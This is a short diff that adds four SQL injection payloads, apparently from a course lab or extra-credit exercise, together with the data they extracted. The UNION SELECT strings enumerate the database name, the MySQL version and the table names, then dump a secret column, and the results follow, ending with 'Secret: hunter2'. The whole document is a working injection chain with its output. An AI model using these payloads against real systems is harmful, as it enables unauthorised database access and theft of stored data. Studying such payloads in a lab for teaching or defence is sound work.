@@ -1,0 +1,14 @@
+1' AND 1=2 UNION SELECT 1, DATABASE(), 2 #
+1' AND 1=2 UNION SELECT 1, @@version, 2 #
+1' AND 1=2 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables where table_schema=database() #
+1' AND 1=2 UNION SELECT 1, group_concat(secret), group_concat(id) FROM SECRETTABLE #
+
+Name: proj2_xtra_cr3dit
+Version: 5.7.29-0ubuntu0.18.04.1
+Tables: SECRETTABLE, foo, inject3_users
+Secret: hunter2
+
+
+
+
+
